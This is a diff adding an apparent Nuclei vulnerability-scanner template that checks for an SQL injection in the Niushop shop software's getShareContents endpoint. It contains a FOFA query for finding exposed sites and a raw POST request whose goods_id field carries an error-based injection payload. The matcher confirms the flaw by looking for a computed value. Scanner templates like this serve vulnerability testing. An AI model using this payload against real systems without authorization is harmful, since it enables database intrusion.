@@ -1,0 +1,36 @@
+id: Niushop-getShareContents-sqli
+
+info:
+  name: Niushop商城-getShareContents-sql注入漏洞
+  author: CyberCG
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata:
+    fofa-query:
+    - body="niushop_url_model" && body="niushop_rewrite_model"
+  tags: tags
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 2
+      - |
+        POST /index.php?s=/wap/goods/getShareContents/// HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Referer: http://{{Hostname}}/index.php?s=/wap/goods/getShareContents///
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 113
+
+        flag=goods&goods_id=84) AND GTID_SUBSET(CONCAT(0x71786a6271,(SELECT (1111*1111)),0x71767a7071),2254)--+&shop_id=0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 &&status_code_2 == 500 && contains(body_2, "1234321")
